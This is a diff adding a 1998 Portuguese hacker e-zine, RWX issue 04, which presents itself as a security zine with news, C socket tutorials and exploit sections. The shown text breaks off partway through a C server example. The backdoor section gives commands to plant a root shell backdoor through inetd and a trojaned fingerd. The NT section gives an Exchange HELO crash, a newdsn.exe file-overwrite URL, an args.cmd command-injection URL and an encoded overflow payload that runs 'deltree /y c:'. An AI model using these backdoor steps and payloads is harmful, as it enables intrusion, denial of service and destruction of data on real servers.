@@ -1,0 +1,1334 @@
+.oO <Start> Oo.
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::::
+:::::::""`````""::::::""`:.:`""::"`````"::'"```'.::::
+:::: .g#S$$$$$S#n  .g#S$$   $$S#n. $$$S#s s#S$$$ ::::
+:::: $$$$$$ $$$$$  $$$$$$ $ $$$$$$ .  $$$ $$$   .::::
+:::: $$$$$$g$$$$$. $$$$$$ $ $$$$$$ :'  $$g$$   .:::::
+:::: $$$$$$ $$$$$$ $$$$$$ $ $$$$$$ ' $$$$ $$$$  '::::
+:::: $$$$$$  $$$$$ $$$$$$.$.$$$$$$ $$$$$ . $$$$$ ::::
+:::: $S$$$$   $$$$ `S$$$$s s$$$$S'.`S$$  :  $$S'.::::
+::::.......:.....:::.............:::....:::....::::::
+:::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+RWX n. 04
+
+dia: o1/o2/98
+(melhor visto com vi, ou edit)
+
+Endereco: www.cyberspace.org/~rwx
+E-mail: rwx@valise.com
+
+---------------------------------------------------------------------[rwx]-
+
+ESCLARECIMENTO
+~~~~~~~~~~~~~~
+
+ Esta e' uma zine voltada a area de seguranca , seja qual  for sua  intencao
+em ler nao nos responsabilizamos  pelo mau uso das informacoes aqui  conti-
+das. Nao estamos  aqui pra ensinar ninguem a ser Hacker ou  um  terrorista,
+nosso  objetivo e a pura troca  de informacao  entre pessoas  que buscam  o
+conhecimento na rede, e nos opomos aqueles que so visam o lucro. Caso  dis-
+corde de algo  ou tenha alguma sujestao, escreva-nos, ficaremos  felizes em
+ouvi-lo.
+
+---------------------------------------------------------------------[rwx]-
+
+FRASES DO MES
+~~~~~~~~~~~~~
+
+"/bin/bash: Out of virtual memory!"
+              (By my Kernel!)
+
+">Ever heard of .cshrc?
+That's a city in Bosnia.  Right?"
+(Discussion in comp.os.linux.misc)
+
+"World domination. Fast."
+(By Linus Torvalds)
+
+"We all know Linux is great...it does infinite loops in 5 seconds."
+(Linus Torvalds about the superiority of Linux on the Amterdam Linux
+Symposium)
+
+"Never make any mistaeks."
+(Anonymous)
+
+"We aren't the ones that the corporations and governments should worry
+about...  We are not the enemy."
+(Retirado da Phrack 50)
+
+"E' chato acreditar que ainda exista imbecis como o pessoal da M.O.S, que
+fica irritado pq a RwX ou outros zines divulgam a seguranca, o que pra
+eles e' uma catastrofe, ja que sao os "maiores hackers do Brasil", e nao
+querem que os admins tirem bugs e etc. Uma pessoa conciente que leu
+aquele besteirol todo sobre as zines, deve saber que aquilo nao passa de
+inveja pelo espaco que conquistamos e pura idioticee, pois sabendo que
+escrevendo aquilo, todos iriam comentar s/ eles e iriam acabar ficando
+famosos como desejam. Parabens para eles que conseguiram seu principal
+objetivo, a fama."
+(DmS da RWX)
+
+---------------------------------------------------------------------[rwx]-
+
+ALGUNS LINKS INTERESSANTES
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+ * http://www.st.com.br/linux - Abaixo assinado Pro-LINUX.Visite
+
+ * http://www.rootshell.com   - Com procurar por exploits e sites de
+seguranca.Uma das mais completas paginas sobre seguranca ja vistas.
+
+ * http://rwx.ml.org   - Essa pagina me eh familiar!:).Nosso site oficial,
+onde estara primeiro as novas zines.
+
+ * http://www.research.att.com/projects/crowds - Crowns projeto.Um projeto
+novo que seria basicamente um surfe anonimo , que evitaria o browser de
+mandar informacoes vitais , etc.
+
+---------------------------------------------------------------------[rwx]-
+
+INDICE
+~~~~~~
+  faqz, textos
+  01#. INTRODUCAO.............................................Group
+  02#. NOVIDADES..............................................Kbyte
+  03#. BACKDOOR...............................................Anarchy
+  04#. BACKUP-LOGS............................................Anarchy
+  05#. SECAO-NT...............................................X-Satanic
+  06#. FAQ C Socket {Lendo Socket}............................KniGHT
+  07#. FAQ C Socket {Servidor}................................X-Satanic
+  08#. PHREAK.................................................The LOrd
+
+  exploits, bugs
+  09#. X BUFFER OVERFLOW......................................KniGHT
+  10#. APACHE 1.2.XX BUG......................................Kbyte
+  11#. BSD TERMCAP BUG........................................Kbyte
+
+  finalizacoes, pedidos, agradecimentos, emails
+  12#. EMAIL'S
+  13#. FUTURO
+  14#. PALAVRAS FINAIS
+
+---------------------------------------------------------------------[rwx]-
+
+01# INTRODUCAO
+~~~~~~~~~~~~~~
+  Ola amigos , estamos na nossa 5 edicao do zine(Provavelmente o maior
+numero de edicoes de um zine de seguranca no brasil). Nesta edicao voce
+vai ver um pouco de tudo. Exploits , Patches , etc. Alguns outros zines ,
+nos culpam por copiar alguma coisa , colocar exploits prontos e patchs ,
+mas simplesmente isso pq nos somos um zine de Seguranca e nao um zine que
+se auto intitula hacker (Ou 3l1t3 como diria os cara do M.O.S.) , nos nao
+mudamos paginas , nos nao nos vangloriamos , nos simplesmente informamos
+os brasileiros dos perigos da internet. Para que nos entramos em um lugar
+e mudarmos a pagina se podemos ajudar os admins a protege-los.Eh mais
+facil vc com seus amiguinhos (do M.O.S) entrar numa maquina de um admin do
+que fazer o admin evitar voce neh?Se copiarmos algo , eh pq achamos
+interessante e queremos que o leitor saiba e nao apenas para enchermos a
+zine. E vamos estrear tambem um tutorial sobre Sockets no C , se tivermos
+uma boa aceitacao continuaremos. Nessa edicao um amigo nosso , anarchy , vai
+escrever pra nos , quem sabe , proximo mes ele escreve de novo. O auth vai
+da um tempo , problemas pessoais , hehe. PELA MILESIMA VEZ NAO SOMOS UM
+ZINE DE 'HACKERS', somos um zine de seguranca , tudo que explicamos aqui e
+para aumentar a seguranca e nao diminui-la. Um YO pro povo das outros
+zines , da POLICY(Outro zine de seguranca , so que parou) , da uground ,
+etc. Um aviso para o pessoal que pede para entrar no grupo ,
+infelizmente nao podemos aceitar o pessoal assim nao , so temos uma
+maneira de aceitar alguem , recebendo materias desse dito cujo e se
+comprovar que realmente merece , estara aki entre nois.Bem , vamos ao que
+interessa.Recebi um email , do 'The Lord Hacker' que nos mandou uma
+materia sobre phreak , e como nao colocamos nada de phreak ate agora , vou
+botar essa materia.To dizendo , mandou a materia , se for boazinha nos
+coloca.Falow manos.
+
+KByte e toda a RwX
+
+OBS :Esse mes nao fiz menus.Ta em projeto um programa que podera ler todas
+as rwxs , com uma interface unica , diminuindo o tamanho da zine etc.Essa
+versao saira so texto , e talvez a proxima venha este prg e outro formato
+da zine , ou somente texto , ou ainda menu de novo , dependendo dos
+pedidos de email.
+
+OBS2 : Anarchy e TheLordHacker aparecem com materias nessa zine.Eles
+mandaram para o email e agora vao ser gratificados com a publicacao de
+suas materias.Valeu galera.
+
+-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-
+
+Disclaimer : Nao queremos aumentar os ataques ao computadores na internet,
+mas sim diminui-los , se vc tem alguma intencao malefica , por favor nao
+va adiante.
+
+-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x
+
+---------------------------------------------------------------------[rwx]-
+
+02# NOVIDADES
+~~~~~~~~~~~~~
+Ola povo , vamos para as news :
+
+* Yahoo hacked(?!) - Noticiaram a invasao do yahoo , e que todos que
+tivessem entrado nele , teria um virus que se agiria no dia do natal , e
+a 'vacina' desse virus so seria liberada se Kevin Mitnick foi solto.O
+yahoo foi mesmo hackeado , mas nao ha nada de virus. O yahoo eh dividido
+em servers de acordo com o browser do internauta , o server que foi
+'hackeado' seria o de LYNX only , afetando menos de 1% dos visitantes do
+yahoo , que veriam uma mensagem "de que hackearam o yahoo" , mas nada de
+virus.
+http://www.clipper.net/~skully/yahoo - Contem a pagina hackeada do yahoo.
+
+* Stack_Guard lancado - Nao tenho muita info sobre esse novo programa mas
+posso fazer uma geral. Esse programa seria um tipo , protetor de buffer
+overflows , que sao a maioria dos exploits de sistemas *NIX-Like. Voce
+compilando os programas em gerais com essa ferramenta , voce estaria livre
+de buffers overflows/overruns , mas esse 'livre' parece ser muito
+limitado, pois ja se tem noticia de varios erros que o Stack_Guard nao
+corrige. Bem , vamos esperar pra ver.
+
+* Novos Windows Crashes - Bonk e NewTear foram lancados a pouco tempo ,
+eles sao pequenos programas que , assim como o famoso OOB e teardrop ,
+'freeze' o windows do individuo. O newtear eh apenas um novo teardrop ,
+que aproveita os patches da microsoft serem superficiais , apenas
+burlando-os.
+
+---------------------------------------------------------------------[rwx]-
+
+03# BACKDOORS
+~~~~~~~~~~~~~~~~
+--->>>Backdoors
+1-Couried
+ Hi all!! Eh com muito prazer que venho escrever pela 1a vez a RwX.
+Mas entao vamos ao rock n' roll!! Um hacker bem inteligente com certeza
+colocaria uma backdoor em sua maquina assim que pegasse root.
+ Aqui vou mostrar como uma linha inutil no seu /etc/services ja ajuda muito
+na hora de uma instalacao de uma backdoor.
+Em qualquer /etc/services contem essa linha:
+courier         530/tcp         rpc             # experimental
+ |               |                                    |
+ |-servico       |porta                               |servico exprimental
+
+Entao se for pensar bem o hacker pode fazer o seguinte:
+HellsBells:/# cp /bin/bash /usr/sbin
+HellsBells:/# mv /usr/sbin/bash /usr/sbin/in.courierd
+--->aqui copiei o bash para o /usr/sbin e renomei o bash para in.couried
+que eh o nome do arquivo que se estabelece a conexao.
+HellsBells:/# chmod a+x  /usr/sbin/in.courierd
+HellsBells:/# echo "courier    stream  tcp   nowait   root
+/usr/sbin/in.courierd -i" >> /etc/inetd.conf
+--->aqui deu um echo /etc/inetd.conf setando a backdoor
+HellsBells:/# killall -HUP inetd
+HellsBells:/# telnet provedor.com.br 530
+Ai voces devem ter notado q algo simples e q naum se usa como o
+in.courierd se virou algo super importante ;)
+E ainda naum fica aquela coisa que da na cara tipo
+telnet  stream  tcp     nowait  root    /bin/sh  /bin/sh -i
+pq isso realmente iria dar na cara q qqer admin o mais burro que seja
+saberia que isso eh uma backdoor.
+Eu naum quis ensinar a ninguem como se faz uma backdoor com uma coisa naum
+usada no sistema igual ao couried mas sim mostrar como eh facil fazer
+colocar backdoor no sistema enganando o admin.
+Entao conselho a todos admins que sempre seeeeeempree facam um bkp do seu
+inetd.conf para vc saber qdo um backdoor eh instalada em seu OS.
+
+2-- Fingerd
+Agora aqui a cobra ja comeca a fumar hehehe ;)
+Aqui a gente ja troca o /usr/sbin/in.fingerd por um trojan do fingerd ai
+fica praticamente impossivel do root saber que esta instalada essa
+backdoor em seu sistema pq esse trojan faz tudo do in.fingerd so que tb
+abre a mais uma backdoor ;) .
+Para os animal eh so fazer isso:
+HellsBells:~# cc -o in.fingerd in.fingerd
+HellsBells:~# mv in.fingerd /usr/sbin
+HellsBells:~# telnet provedor.com.br 79
+Trying provedor.com.br...
+Connected to provedor.com.br.
+Escape character is '^]'.
+bah  <---- ai aqui vc digita sua senha que no caso seria bah
+bash#  <----depois cairia na backdoor ;)
+
+Muito simples.Anexo vai o programa
+fingtrojan.c
+------------
+Aos admins digo que a solucao eh desabilitar o finger do inetd.conf e
+fazer um bkp do mesmo em caso de alteracoes feito nele por um hacker.
+
+AnArChY
+
+---------------------------------------------------------------------[rwx]-
+04# BACKUP LOGS
+---->>>Fazendo bkp dos logs  By AnArChY
+      =====================
+
+Cansado de ver as coisas faceis como estao resolvi escrever essa materia.
+Pelo menos para tentar colocar cada SO mais seguro.
+Essa materia com certeza vai agradar muitos admins ou pelo menos
+ajuda-los. Todos nos sabemos que os arquivos de logs sao:messages,
+lastlog,wtmp,utmp.
+Portanto qqer um que invadisse sua maquina saberia onde eles estao
+facilmente,  dando um find ou indo nos seus respectivos dirs,
+eles os achariam e para naum deixar logs os apagariam ou darian echo neles
+Entao resolvi colocar aqui programas que vao ajuda-los. ahhh agradeco ao
+kbyte por cede-los.
+Entao siga os passos para sair tudo blz! ;)
+
+1o vou dar pra vcs um novo script no hosts.deny que achei muito massa!
+
+HellsBells:/# pico /etc/hosts.deny
+
+#
+# hosts.deny    This file describes the names of the hosts which are
+#               *not* allowed to use the local INET services, as decided
+#               by the '/usr/sbin/tcpd' server.
+#
+# The portmap line is redundant, but it is left to remind you that
+# the new secure portmap uses hosts.deny and hosts.allow.  In particular
+# you should know that NFS uses portmap!
+ALL: ALL : TWIST /var/log.sh ; \
+         /bin/echo -e "%h tentou acessar %d " >> /var/log/tcpd.log ;
+
+esse eh um novo tipo de script no host.deny muito legal eganando os
+babacas que tentarem invadir sua maquina.
+Mesmo sabendo, vou explicar cada linha agora pq o mundo naum eh feito so
+de gurus. :]
+ALL: ALL : TWIST /var/log.sh ; \ <-- essa linha fecha todos os servicos
+para qqer um que tentar algo em sua maquina. E o log.sh eh o script
+que vou colocar em baixo para para enganar o paspalho que tentar invadir
+sua maquina. Vou mostrar oq o programa faz, vejam so:
+
+HellsBells:/# telnet provedor.com.br
+Trying provedor.com.br
+Connected to provedor.com.br
+Escape character is '^]'.
+core dumped
+bash#
+
+hehehe acontece isso so que qdo o babaca pensa ''oba! cai na bash#'' ele
+pega e digita ''ls'' ou qqer coisa fode o console dele todo, tendo que dar
+um logout! ahahahhaa muito massa! Instalem e vejam! ;)
+
+Mas naum acaba por ai a linha:
+/bin/echo -e "%h tentou acessar %d " >> /var/log/tcpd.log ;
+ele vai gravar quem acessou seu telnet ou ftp ou qqer merda e mandar pro
+/var/log/tcpd.log. ai qqer coisa eh so dar tail -f /var/log/tcpd.log para
+ver quem tentou logar na sua maquina.
+O brinde vai junto com a zine se chama log.sh
+
+Abaixo segue a explicacao do script
+
+----------------------explicacao do script-------------------------------
+#!/bin/sh
+#Script by KByte
+echo "Core dumped" ------ imprime na tela Core dumped
+echo -n "bash# "--------imprime na tela bash#
+read command ----lendo o comando dado pela pessoa na bash#
+sleep 5 ------dormindo 5 segundos
+^[#8^[[?3;5h^[(0] ^[[2J^V^O^[#8^[[?3;5h^[(0^O^O^O^N^X **^XB00
+|------fudendo o console do cara.
+-------------------------explicacao do script-------------------------
+
+Brinde a parte vamos aos bkps.
+
+Vc deve estar pensando e oq isso tem a ver com bkp de logs?
+Velho....... relaxa isso era um script de brinde naum queria? entao naum
+instale... vc esta tenso. :]
+Aqui vou colocar o programa chamado getmes. Ele separa cada parte do
+messages: kernel,login,pppd,init,syslogd,named,amd,modeprob e last.
+E manda tudo para o /etc/log/ com seus respectivos nomes.  exemplo:
+cat /var/log/messages | grep kernel >> /etc/log/kernel ;
+depois faz um bkp do messages no /var/log/msgs.bkp e apaga o messages.
+Agora vem a vez do tcpd.log que colocamos no hosts.deny e o programa faz o
+seguinte comando:
+cat tcpd.log >> /etc/log/tcpd ;
+cat tcpd.log >> tcpd.log.old ;
+rm -rf tcpd.log ;
+Esta ai galera o BKP dos logs se vc naum tiver entendido oq escrevi aqui
+se mate! hehehehehe
+esta ai o script de bkp de logs vou explicar cada parte dele. Ele vira
+juto com a zine. chama -se getmes.
+
+#!/bin/sh
+#Script by KByte
+if [ -f /var/log/messages ]; then
+cat /var/log/messages | grep kernel >> /etc/log/kernel ;
+|--- ele le o /var/log/messages e separa as mensagens do kernel e manda
+para o /var/log/kernel. No login,pppd,init,syslog,named,amd,modprobe e
+last ele faz a mesma coisa.
+cat /var/log/messages | grep login >> /etc/log/login ;
+cat /var/log/messages | grep pppd >> /etc/log/pppd ;
+cat /var/log/messages | grep init >> /etc/log/init ;
+cat /var/log/messages | grep syslogd >> /etc/log/syslog ;
+cat /var/log/messages | grep named >> /etc/log/named ;
+cat /var/log/messages | grep amd >> /etc/log/amd ;
+cat /var/log/messages | grep modprobe >> /etc/log/modprobe ;
+cat /var/log/messages | grep last >> /etc/log/last ;
+cd /var/log ;
+cat messages >> msgs.bck ; ---- aqui ele copia o messages pro messages.bck
+rm -rf messages ; ------ apaga o messages
+fi ;
+if [ -f /var/log/tcpd.log ]; then
+cat tcpd.log >> /etc/log/tcpd ; -----pega os logs do host.deny se vc
+colocou igual ao brinde ai em acima
+cat tcpd.log >> tcpd.log.old ; ----- agora ele manda o tcpd.log para o
+tcpd.log.old
+rm -rf tcpd.log ; ----- e finalizando apaga do tcpd.log
+fi ;
+--------------------------explicando o script-----------------------------
+agora que vcs ja entederam como funciona o script eh so pegar ele e
+colocar no /var se quiser, so estou pegando o /var como exemplo.
+depois:
+
+HellsBells:/# pico /etc/crontab
+
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# Run any at jobs every minute
+* * * * * root [ -x /usr/sbin/atrun ] && /usr/sbin/atrun
+
+# run-parts
+01 * * * * root run-parts /etc/cron.hourly
+02 1 * * * root run-parts /etc/cron.daily
+02 2 * * 0 root run-parts /etc/cron.weekly
+02 3 1 * * root run-parts /etc/cron.monthly
+
+# Remove /tmp, /var/tmp files not accessed in 10 days (240 hours)
+41 02 * * * root /usr/sbin/tmpwatch 240 /tmp /var/tmp
+
+# Remove formatted man pages not accessed in 10 days
+39 02 * * * root /usr/sbin/tmpwatch 240 /var/catman/cat?
+0,5,10,15,20,25 * * * *  root /var/getmes >/dev/null 2>&1
+|
+|----acrescente esta ultima linha no seu /etc/crontab
+Isso fara com que de 5 em 5 min leia e atualize seus bkps de log.
+agora eh so dar killall -HUP crond e esta tudo prontu!
+Mas olhem aconselho a mudarem os dirs defaults aqui sitados pq um leitor
+mais intensionado poderia saber onde estao os logs se vc deixar default.
+Eh pessoal assim as coisas com certeza ficarao mais dificeis para a mocada
+mal intensionada, ficando mais facil de pegar seus rastros.
+Espero que tenham gostado ;)
+
+falow galera!!!
+AnArChY
+
+---------------------------------------------------------------------[rwx]-
+
+05# NT
+^^^^^^
+RWX NT Labs.
+~~~~~~~~~~~~
+E ai galera! poise... tamo nois de volta... mermao...
+Tipo, se sairem por ai, falando que RWX e' um zine irregular, etc... e' pq
+nao sao vcs que tem que fazer prova e inda escrever zine!  haiuh ai =)
+Essa mes, resolvi terminar as materias sobre Website for NT/W95, adicionei
+uma materia de IIS3, e completei com um overflow no Exchange (Quente
+ainda) !
+Se tudo correr como eu quero, proximo mes tem umas coisinhas especial pra
+NT! e tudo desenvolvido pra RWX NT Labs.
+Hun.. vamo partir pra trabai.. que hoje tem prova!
+/*                                                            X-SaTaNiC */
+
+[Microsoft Exchange Buffer Overflow]
+(descobridor: rootshell)
+
+OBS: Se vc achar copiacao, foda-se e leia a introducao do zine!
+
+Por enquanto, soh podemos dar um crash no server de Mail, mas talvez, seja
+possivel usar esse overflow para executar comandos remotamente, nos tb
+tamo trabalhando nisso. ;-)
+Esse aqui, parece muito mermo com aquele do SLmail2.4
+
+Vulneravel: Microsoft Exchange Internet Mail Service 5.0.1457.7
+nao foi possivel dar um crash na 5.5
+
+derrubar e' muito simples, telnet pra porta de sendmail, e digite:
+
+HELO rwxxxxxxxxxxxx...
+(digite muitos e muitos, exagerademente!)
+
+a outra maneira, e':
+HELO rwx
+MAIL FROM: rwx...
+(vc sabe o que fazer)
+
+Bem e' soh...
+[X-SaTaNiC]
+
+--------------------------------------------------------------------------
+NEWDSN Problem
+~~~~~~~~~~~~~~
+
+Sistemas Afetados: WinNT com IIS3.0 e newdsn.exe (OBS: hun 85% dos NT
+Servers
+usam isso)
+[What]
+Bem, isso aqui e' muito simples.. simples mermo! :)
+Tipo, os IIS3 possuem um executavel que permite a criacao de DataBases (do
+Microsoft Access Database) no seu sistema. Esse bug do newdsn e' bem
+simples,
+mas pode ser muito importante.
+O que o bug faz? permite a criacao de Databases com 0bytes (apenas) em
+qualquer
+local do seu sistema... olhando assim isso nao parece importante, mas se
+por
+acaso eu criar uma database com win.com no diretorio %systemroot%\system32
+?
+hehe olhando por esse lado nao parece tao inofensivo neh!:)
+[XpL0iTiNg]
+Mande um query para:
+http://victim/scripts/tools/newdsn.exe?driver=Microsoft%2BAccess%2BDriver%2B%28$Criancas,
+nao tentem isso em casa! Isso reescreveria um arquivo WIN.COM do
+sistema de NT!
+[Ahh!! Help me]
+A solucao para isto e':
+c:\InetPub\wwwroot\scripts\tools> DEL NEWDSN.EXE
+hehe DELETE-O!
+
+-= X-SaTaNiC!1998! So kind as a twister! =-
+-----------------------------------------------------------------------------
+[Website 1.1e -(Args.cmd & C-Sample Buffer Overflow-)]
+[descobridor dos bugs: solar@ideal.ru]
+
+1 - args.cmd
+Tipo, no website1.1e tem um bugzim idiota e muito conhecido (o erro) pela
+galera! esse aqui permite executar comandos remotamente...
+olhem o erro no args.cmd:
+
+QUERY_STRING=%QUERY_STRING
+
+Sem as " " e' um perigo... poise, a empresa do Website conseguiu...
+brilhantes
+programadores de la nao?!
+Agora e' soh exploitar!:)
+envie um query de seu browser para:
+http://vitima/cgi-dos/args.cmd?"%qualquer+comando"
+
+FIX -> A Linha deve ficar assim:
+    -> QUERY_STRING=%QUERY_STRING
+
+2 - win-c-sample overflow
+
+Esse aqui, e' ate' uma negacao! Existe um arquivo EXEMPLO que vem nos
+Website1.1e (outros?), e'... agora o problema e' que nem exemplo esse povo
+sabe fazer!
+
+source do programa: cgi-src/win-c-sample/win-c-sample.c
+executavel        : cgi-shl/win-c-sample.exe
+
+lah, tem uma linha como essa:
+char *argv[32]; // Max 32 command line args
+
+Isso e' passada pra SplitArgs(), qual nao checa os paramatros da linha do
+comando! ... ;-)
+Exploitar e' facir, mande um query para esse programa, com longos
+argumentos
+e no final, execute o comando!
+OBS: no lugar de espaco, usa-se _
+----------------------------------------------------------------------
+http://website.host/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C6Lj%01V%8A
+%06%FF%E6%FF%D4%83%C6Lj%01V%8A%FF%E6%FF%D4%83%C6Lj%01V%8A%FF%E6%FF%D4
+%83%C6Lj%01V%8A%FF%E6%FF%D4%83%C6Lj%01V%8Adeltree_/y_c:
+----------------------------------------------------------------------
+
+FIX -> rm -r.. opz! del win-c-sample.exe  =)
+
+Pronto... agora vou estudar, e depois....... na proxima RWX vcs veem!
+
+-----------------------------------------------------------------[rwx]--
+
+06# FAQ C SOCKET {Lendo Socket}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+TCP Socket Programing
+~~~ ~~~~~~ ~~~~~~~~~~
+by Knight(outlook.motel@usa.net)
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+* Abordando Escrevendo / Lendo / Stream's Socket's *
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  Opa!! :) e ai galera to de volta .. hehehe!!! :) nesse mes eu e o X-Satanic
+ estamos fazendo uma materia junto, onde gostariamos de ajudar a galera que
+ ta encontrando problemas para comecar a escrever seu programas utilizando
+ socket( no meu caso pra aprender.. deu uma dor de cabeca ... :) ), nesse
+ mes eu pretendo esclarecer/ensinar/usar/explicar a parte de ESCREVER &
+ LER & TORNA SOCKET STREAM . Se rolar no proximo numero da RWX eu e o
+ X-SaTaNiC vamos dar continuacao a materia :) ( Voce pensa que eh pouco )
+
+ Vamos La entao :)
+
+ + TURN ON PC +
+-> Start Linux <-
+
+  Vou procurar explicar, e sempre no final de cada explicacao colocarei
+ um exemplo bem pratico sobre o que eu expliquei.. espero ajudar muito :)
+ e qualquer duvida.. nao exite ;) (outlook.motel@usa.net) ou rwx@null.net
+ .
+                              *PERFECT WORLD*
+
+  Pronto!!! Agora chega de enrolacao e vamos la ;)
+
+ =1= ESCREVENDO NO SOCKET =1=
+
+   Para se escrever em um socket, geralmente se duas funcoes.. voce pode
+  escolher entre elas, que no caso sao 'write' e 'send'.
+   Ex)
+        char variavelchar1[80];
+	char variavelchar2[80];
+
+	sprintf(variavelchar1, "USER root\n");
+	sprintf(variavelchar2, "PASS root\n");
+
+	write(socket, variavel1, strlen(variavel1)); // As duas tem a mesma
+	                                               funcao!
+	send(socket, variavel1, strlen(variavel1),0); // Mesma coisa que write
+
+  Oque acabamos de realizar??????
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   EHHE acabamos de escrever USER root e depois PASS root na porta em que
+  escolhemos que no caso seria definido pelo sin.sin_port = htons(110)
+  que seria bem adequado ao caso.
+   A sintaxe do write e :
+
+      write(socket, variavel1, strlen(variavel1));
+      |       |        |                  |
+      |_ Funcao Propriamente dita.        |
+              |        |                  |
+	      |_ Variavel que joga para o socket. ( pode ser qualquer uma )
+                       |                  |
+                       |_ Variavel que voce criou onde ficara armazedado
+		           ' USER root <ENTER> '
+			                  |
+                                          |_ Tira os espacos em branco
+					     do variavel1
+
+   A sintaxe do send e parecida com a do write so muda o final:
+
+      send(socket, variavel1, strlen(variavel1),0);
+      |       |        |                  |     |
+      |_ Funcao Propriamente dita.        |     |_ To pra descobrir :) hehe
+              |        |                  |
+	      |_ Variavel que joga para o socket. ( pode ser qualquer uma )
+                       |                  |
+                       |_ Variavel que voce criou onde ficara armazedado
+		           ' USER root <ENTER> '
+			                  |
+                                          |_ Tira os espacos em branco
+					     do variavel1
+
+  =2= LENDO SOCKET'S =2=
+
+    Para ser ler um socket pode ser usar de 2 modos :) o primeiro e mais
+   e eu acho que tmb e mais utilizado ( mais nao melhor :) eheh), e usando
+   a funcao read e outro tipo e usando arquivo do tipo int sockdestino; e
+   atribuindo o socket a o arquivo tornando o socket REALY STREAM :) Eita
+   definicao boa . Vamos as ExPlicacoes e os Exemplos Rapidos :).
+
+   -> Usando Send <-
+
+    Para voce ler um socket. basta voce cria um variavel do tipo char
+   e definir um tamanho para essa variavel que no caso seria o numero maximo
+   do buffer do socket, ou o maximo que seria lido no socket para se
+   criar a variavel com numero maximo basta :
+
+     char euqueroler[4048]; <- este [4048] pode ser qualquer numero :)
+
+    Pronto criada a variavel basta voce cria um variavel do tipo integer
+    que sera usado so para unir tudo.
+
+     int sockdest2;
+
+    Agora basta montar :
+
+     sockdest2=read(sock, euqueroler, 4048);
+
+    O que acabamos de Realizar???
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    Rapaz , o que acabou de acontecer , e que o programa acaba de jogar
+    tudo que apareceu no socket ( que no caso o daemon escreveu ), na variavel
+    ' euqueroler ' onde vai ler somente 4048 ( somente?? ) ai para voce ver
+    o que tem na variavel basta dar um :
+
+     printf("%s\n", euqueroler);
+
+     Pronto :).
+
+     Sintaxe do read:
+
+      int sockdest2;
+      char euqueroler[4048];
+      sockdest2 = read(sock, euqueroler, 4048);
+         |         |    |        |         |
+	 |         |    |        |_ Variavel a escrever o que pegou do socket
+	 |_ Variavel temporaria ( vai unir a funcao toda )
+ 	           |    |                  |
+		   |_ A propria funcao     |_ Numero MAX. do Buffer
+                        |
+			|_ Joga para o socket ( alias pega )
+
+   <X> Usando Send <X>
+
+   -> Usando Read Stream <-
+
+     Desta forma voce nao precisa ficar criando varias variaveis para ler
+    o socket, tornando o programa melhor, mais nao tem muita importancia..
+    tem gente que prefere read a usar este tipo de funcao para ler coisa
+    que vem do socket hehe isso vem que qualquer um... ehhe eu to aqui pra
+    explicar !! :)..
+
+     Como ler um socket desta forma??
+
+      Famos de conta que o programa de connecao que por acaso usa a variavel
+      int socketdetino; para lermos o que vem dela basta digitar o seguinte.
+
+      int sockdestino;
+      FILE *fd; // Pode ser qualquer nome *nome
+
+      if((fd=fdopen(sockdestino, "r")) == NULL ) {
+        printf("Cara.. ta com problema no Socket Stream");
+	exit(0);
+      }
+
+       Pronto aqui ja associamos um arquivo que no caso e o *fd a o socket
+      que no caso e o sockdestino. No caso usamos um if para fazer um veri-
+      ficacao de erro.. caso nao haja nenhum segue o programa normal.
+
+      Sintaxe do fdopen
+
+       if((fd=fdopen(sockdestino, "r")) == NULL ) <- NULL caso de algum erro
+       |    |   |         |        |     |_ 2 igual ( igualmente absoluto )
+       |_ Testa If 'Caso' |        |_ Read and Write
+            |   |         |_ A variavel
+	    |_ Variavel criada pelo FILE *fd; (tipo stream)
+                |
+		|_ Torna associavel o arquivo 'tipo stream' a variavel
+		   integer sockdestino
+
+   <X> Usando Read Stream <X>
+
+  EEHEHH galera eu acho que com isso acaba a minha materia desse mes :) epa
+ pera ai ;) ehhe faltou os exemplos.. calma vou colocar alguns ai .. :)
+
+Exemplos :escrevendo.c , lendoread.c e lendostream.c
+
+---------------------------------------------------------------------[rwx]-
+
+07# FAQ C SOCKET {Servidor}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Tipo... isso aqui nao tem muito haver com seguranca.. (sera?)....
+ja' vi muito daemon com backoor dentro, que abre socket... pra alguma pessoa
+que nao tah entendendo aquilo, nao vale nada, mas pra' alguem que saca, ao
+menos um basico, tudo tem muito sentido!
+
+oOo [Servidor] oOo:
+O que eh um servidor?
+Um Servidor, e', onde o client se conecta para fazer seu trabalho....ex:
+BitchX e' o client e irc.rwx.mil e' o servidor de IRCD.
+Um client nao pode gerenciar uma conexao sozinho para um host, precisa de um
+servidor do outro lado da conexao para gerenciar e mostrar-lhe o que fazer)
+Quando um client conecta a um servidor, eles nao vao logo estabilizando a
+conexao... sempre ha' uma troca de dados de identificao e reconhecimento antes.
+A relaco de conexao de desconexao de Client/Servidor sera' explicada mais
+abaixo, junto com um quadro.
+
+oOo [Montando um Servidor] oOo:
+Bem, primeiro de tudo vc tem que conhecer um minimo de C para montar um servidor,
+mesmo que nao seja de nada, heueh =)
+Bem, comecemos....Tome nota:
+
+/* #############-------[BEGIN HELLO WORLD SERVER]---------############### */
+
+#include "rwx_socket.h"
+
+/* ############################################## */
+/* Vai junto com o Zine, contem as coisas basicas para se montar um cliente/servidor */
+/* ############################################## */
+
+main() {
+char buffer1[1025];
+
+/* ########################################### */
+/* Dois arrays que serao usados como buffer    */
+/* para as info que o server enviara           */
+/* ############################################*/
+
+int listen_sock, conec_sock;
+
+/* ##################################################*/
